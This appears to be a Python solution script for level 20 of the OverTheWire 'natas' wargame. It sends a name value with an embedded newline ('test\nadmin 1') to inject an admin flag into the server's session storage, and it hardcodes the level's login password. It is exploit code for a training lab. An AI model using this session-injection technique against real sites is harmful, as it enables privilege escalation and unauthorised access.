import requests

def get_page_text():
	hack = {"name": "test\nadmin 1"}
	session = requests.Session()
	session.post(
		"http://natas20.natas.labs.overthewire.org",
		auth= ("natas20", "eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF"),
		data= hack)
	req = session.get(
		"http://natas20.natas.labs.overthewire.org",
		auth= ("natas20", "eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF"))
	return req.content


def main():
	print get_page_text()

if __name__ == "__main__":
	main()